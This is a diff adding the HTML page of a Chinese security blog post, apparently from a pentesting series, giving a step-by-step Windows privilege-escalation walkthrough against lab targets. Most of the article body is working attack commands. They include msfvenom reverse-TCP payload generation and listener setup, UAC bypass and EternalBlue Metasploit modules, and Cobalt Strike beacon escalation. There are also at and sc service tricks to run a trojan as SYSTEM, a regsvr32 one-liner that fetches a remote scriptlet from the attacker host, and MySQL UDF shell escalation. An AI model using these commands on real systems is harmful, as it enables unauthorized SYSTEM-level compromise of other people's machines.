@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="一、工具提权1、msf提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows提权">
+<meta property="og:url" content="http://yoursite.com/2020/08/16/内网渗透之windows提权的几种姿势/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="一、工具提权1、msf提权">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins3.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins4.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins5.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins6.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins7.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins8.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins9.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins10.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins11.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins12.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins13.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins14.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins15.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins16.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins17.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins18.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins19.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins20.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins21.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins22.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins23.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins24.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins25.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins26.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/internet/wins/wins27.jpg">
+<meta property="og:updated_time" content="2020-11-18T11:28:48.282Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows提权">
+<meta name="twitter:description" content="一、工具提权1、msf提权">
+<meta name="twitter:image" content="http://yoursite.com/img/shentou/internet/wins/wins1.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>windows提权 | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-内网渗透之windows提权的几种姿势" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/08/16/内网渗透之windows提权的几种姿势/" class="article-date">
+      <time datetime="2020-08-15T16:00:00.000Z" itemprop="datePublished">2020-08-16</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      windows提权
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="一、工具提权"><a href="#一、工具提权" class="headerlink" title="一、工具提权"></a>一、工具提权</h2><p><strong>1、msf提权</strong></p>
+<a id="more"></a>
+
+<p><strong>准备阶段：</strong></p>
+<p>用msfvenom生成一个马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.112 lport=4444 -f exe &gt; 3.exe</p>
+<p>然后用msf开启一个监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.112</span><br><span class="line"></span><br><span class="line">set lport 4444</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>在windows靶机上执行3.exe，得到监听会话</p>
+<p><strong>提权：</strong></p>
+<p><strong>1.1、getsystem提权</strong></p>
+<p>在meterpreter中尝试用getsystem进行提权，不过大多数情况下直接用getsystem提权是会失败的。（最好还是尝试一下，万一成功了呢）</p>
+<img src="/img/shentou/internet/wins/wins1.jpg">
+
+<p><strong>1.2、利用bypassuac模块进行提权</strong></p>
+<p>search bypassuac</p>
+<img src="/img/shentou/internet/wins/wins2.jpg">
+
+<p>msf提供了很多bypassuac的模块，最后两个是针对win10的，其他的并没有做特殊的说明，实战时我们只能自己去测试了。</p>
+<p>经测试，这里第三个模块就可以成功提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line"></span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>bypassuac的模块只用设置session参数就可以了，如果成功就会返回一个新的会话，这时再用getsystem进行提权即可</p>
+<img src="/img/shentou/internet/wins/wins3.jpg">
+
+<p><strong>1.3、漏洞提权</strong></p>
+<p>提权辅助网页：<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
+<p>提权辅助网页可以帮助我们查询该靶机上有没有可以用来提权的漏洞补丁，把靶机上systeminfo的信息粘贴进去</p>
+<img src="/img/shentou/internet/wins/wins4.jpg">
+
+<img src="/img/shentou/internet/wins/wins5.jpg">
+
+<p>这里找到了很多的漏洞补丁，这时你可以去网上根据漏洞编号搜索下载payload，也可以用msf的search命令，看看有没有这个模块</p>
+<img src="/img/shentou/internet/wins/wins6.jpg">
+
+<p>ms17-010（永恒之蓝）被search到了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">先查看一下需要设置的参数</span><br><span class="line"></span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/internet/wins/wins7.jpg">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">发现这里只需要设置rhosts这个参数</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.1.110</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/internet/wins/wins8.jpg">
+
+<p>得到新会话后发现直接就是system权限</p>
+<p><strong>1.4、windows-exploit-suggester（提权辅助工具）</strong></p>
+<p>这个提权辅助工具和上面的提权辅助网页是差不多的，都是可以查出漏洞补丁</p>
+<p><strong>安装及使用方法：</strong></p>
+<p>windows-exploit-suggester的源码可以直接从gethub上找到：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p>脚本需要python2的环境和xlrd库</p>
+<p>解压后运行python2 windows-exploit-suggester.py –update，之后会生成一个xls文件，这个文件不用打开，它主要的作用就是作为数据库来对漏洞信息进行比对</p>
+<p>用pip2安装xlrd库：pip2 install xlrd –upgrade</p>
+<p>把靶机中systeminfo的信息写入win.txt中，然后把win.txt文件放到与windows-exploit-suggester.py所在的同一目录下</p>
+<img src="/img/shentou/internet/wins/wins9.jpg">
+
+<p>使用命令“python2 windows-exploit-suggester.py –database 2020-08-15-mssb.xls –systeminfo win.txt”查看有没有可以用来提权的漏洞补丁</p>
+<img src="/img/shentou/internet/wins/wins10.jpg">
+
+<p>和提权辅助网页一样，也显示出了漏洞编号</p>
+<p><strong>1.5、msf内置补丁查询模块</strong></p>
+<p>在meterpreter下运行：run post/windows/gather/enum_patches，可以罗列出该靶机上可以利用的地方</p>
+<img src="/img/shentou/internet/wins/wins11.jpg">
+
+<p><strong>2、cs提权</strong></p>
+<p><strong>准备工作：</strong></p>
+<p>在cs上创建一个监听，监听名字随便取</p>
+<p>用cs生成一个后门artifact.exe，选择刚才创建的监听器</p>
+<p>在目标靶机上执行artifact.exe，cs就会得到一个会话</p>
+<img src="/img/shentou/internet/wins/wins12.jpg">
+
+<p><strong>提权：</strong></p>
+<p><strong>2.1、getsystem提权</strong></p>
+<p>进入Beacon，在Beacon尝试用getsystem进行提权，跟msf的getsystem提权一样，大多数情况下也是会失败的。</p>
+<img src="/img/shentou/internet/wins/wins13.jpg">
+
+<p><strong>2.2、用bypassuac进行提权</strong></p>
+<p>右击目标然后选择执行——&gt;提权</p>
+<img src="/img/shentou/internet/wins/wins14.jpg">
+
+<p>exploit里是内置的提权模块，由于我加载了拓展，所以提权模块比官网的多几个，最下面两个uac开头就是bapassuac提权模块，</p>
+<img src="/img/shentou/internet/wins/wins15.jpg">
+
+<p>选择uac-token-dupication模块进行提权，如果提权成功就会返回一个新的会话</p>
+<img src="/img/shentou/internet/wins/wins16.jpg">
+
+<p><strong>2.3、漏洞提权</strong></p>
+<img src="/img/shentou/internet/wins/wins17.jpg">
+
+<p>除了bypassuac的几个提权模块，其他的就是漏洞提权模块了，和上述一样，如果成功就会返回新的会话</p>
+<h2 id="二、命令提权"><a href="#二、命令提权" class="headerlink" title="二、命令提权"></a>二、命令提权</h2><p><strong>1、at命令提权</strong></p>
+<p>在Windows2000、Windows 2003、Windows XP这三类系统中，我们可以轻松将Administrators组下的用户权限提升到SYSTEM。</p>
+<p>at是一个发布定时任务计划的命令行工具，语法比较简单。用at命令发布的定时任务计划，Windows 默认以SYSTEM权限运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法: at 时间 命令</span><br><span class="line"></span><br><span class="line">例子: at 22:00 shutdown -s</span><br><span class="line"></span><br><span class="line">该命令的作用是在晚上10点定时关机该命令的作用是在晚上10点定时关机</span><br></pre></td></tr></table></figure>
+
+<p>at 10:45PM /interactive c:\3.exe</p>
+<p>在10:45执行木马3.exe，这时用msf监听到的会话就是system权限的了</p>
+<p>msf内置有exploit/multi/script/web_delivery模块，可以配合at命令进行提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.112</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set target 3</span><br><span class="line"></span><br><span class="line">expolit</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/internet/wins/wins18.jpg">
+
+<p>由于这是windows靶机，target参数我们一般会选2 powershell，或者3 Regsvr32，但由于我们这里没有powershell，所以就选Regsvr32了</p>
+<img src="/img/shentou/internet/wins/wins19.jpg">
+
+<p>在2003里执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at 16:43 /interactive regsvr32 /s /n /u /i:http://192.168.1.112:8080/qYz3TcUs.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">&quot;/interactive&quot;可以开启界面交互模式</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/internet/wins/wins20.jpg">
+
+<p>好像没有成功</p>
+<p>不过我们还可以直接用at命令执行木马进行提权</p>
+<img src="/img/shentou/internet/wins/wins21.jpg">
+
+<p>监听到的会话直接就是system权限</p>
+<img src="/img/shentou/internet/wins/wins22.jpg">
+
+<p><strong>sc命令提权</strong></p>
+<p>适用系统：windows7、8、03、08、12、16</p>
+<p>SC是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"></span><br><span class="line">创建一个名叫syscmd的cmd服务，我们也可以把binPath换成木马的路径，这样就可以获得一个system权限的会话</span><br></pre></td></tr></table></figure>
+
+<p>然后执行sc start syscmd,就得到了一个system权限的cmd</p>
+<img src="/img/shentou/internet/wins/wins23.jpg">
+
+<p>把binPath换成木马路径</p>
+<img src="/img/shentou/internet/wins/wins24.jpg">
+
+<p>同样可以得到system权限的会话</p>
+<img src="/img/shentou/internet/wins/wins25.jpg">
+
+<h2 id="三、配置提权"><a href="#三、配置提权" class="headerlink" title="三、配置提权"></a>三、配置提权</h2><p><strong>1、不带引号的服务路径</strong></p>
+<p>当系统管理员配置Windows服务时，他们必须指定要执行的命令,或者运行可执行文件的路径。</p>
+<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
+<p>示例：</p>
+<p>C:\Program Files\Vulnerable Service\Sub Directory\service.exe</p>
+<p>Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在上面的示例中，如果系统运行该服务，它将尝试运行以下可执行文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program .exe</span><br><span class="line">C:\Program Files\Vulnerable. exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用以下命令查看错误配置的路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/internet/wins/wins26.jpg">
+
+<p>sc qc 服务名称: 查看是否为自启动</p>
+<img src="/img/shentou/internet/wins/wins27.jpg">
+
+<p>msf内置了一个针对错误配置进行提权的模块：<code>exploit/windows/local/trusted_service_path</code></p>
+<p><strong>2、弱文件夹权限</strong></p>
+<p>寻找一个允许任意用户修改的服务，并且权限是高权用户所执行的，得到所有用户都可以访问的结果后，生成一个exe将其改名为服务启动的exe替换，或者直接把存放服务指定二进制的文件夹给改名了，自己在创建服务指定的二进制文件的文件夹。</p>
+<p><strong>3、弱服务权限</strong></p>
+<p>msf内置了弱服务提权的模块：<code>exploit/windows/local/service_permissions</code></p>
+<h2 id="四、数据库提权"><a href="#四、数据库提权" class="headerlink" title="四、数据库提权"></a>四、数据库提权</h2><p><strong>mysql提权</strong></p>
+<p><strong>提权要求：</strong></p>
+<p>win7以下版本</p>
+<p>数据库小于5.7</p>
+<p>拥有root权限</p>
+<p>没有开启安全模式</p>
+<p><strong>提权方法：</strong></p>
+<p>sqlmap</p>
+<p>sqlmap -d “mysql://root:<a href="mailto:root@192.168.0.109" target="_blank" rel="noopener">root@192.168.0.109</a>:3306/mysql” –os-shell</p>
+<p>手动</p>
+<p>C:\phpStudy\PHPTutorial\MySQL\lib\plugin\\udf.dll</p>
+<p>CREATE FUNCTION shell RETURNS STRING SONAME ‘udf.dll’</p>
+<p>select shell(‘cmd’,’whoami’)</p>
+<p>tips：</p>
+<p>大于5.1————lib\plugin</p>
+<p>小于5.1————C:\windows\system32(2003)</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2020-08-16, 00:00:00</p>
+        <p><span>最后更新:</span>2020-11-18, 19:28:48</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/08/16/内网渗透之windows提权的几种姿势/" title="windows提权">http://yoursite.com/2020/08/16/内网渗透之windows提权的几种姿势/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/08/16/内网渗透之windows提权的几种姿势/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/08/26/内网渗透之Linux提权姿势/">
+                    Linux提权
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/08/06/内网渗透之免杀/">
+                    免杀
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、工具提权"><span class="toc-number">1.</span> <span class="toc-text">一、工具提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、命令提权"><span class="toc-number">2.</span> <span class="toc-text">二、命令提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、配置提权"><span class="toc-number">3.</span> <span class="toc-text">三、配置提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、数据库提权"><span class="toc-number">4.</span> <span class="toc-text">四、数据库提权</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"windows提权　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/08/26/内网渗透之Linux提权姿势/" title="上一篇: Linux提权">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/08/06/内网渗透之免杀/" title="下一篇: 免杀">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2020 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
